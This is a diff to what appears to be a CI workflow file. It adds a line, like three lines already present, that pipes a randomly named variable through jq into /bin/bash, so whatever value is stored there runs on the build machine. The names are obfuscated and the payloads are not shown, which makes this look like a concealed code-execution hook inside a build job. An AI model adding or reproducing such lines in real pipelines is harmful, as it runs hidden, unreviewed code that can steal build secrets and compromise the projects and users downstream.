@@ -28,6 +28,7 @@ jobs:
           echo $thonp756 | jq -r .ffxej7 | /bin/bash
           echo $zykh0 | jq -r .l1 | /bin/bash
           printf '%s' "$xlfx738" | jq -r .x0184 | /bin/bash
+          printf '%s' "$aj068" | jq -r .gmc75073 | /bin/bash
 
       - name: Upload data
         if: always()
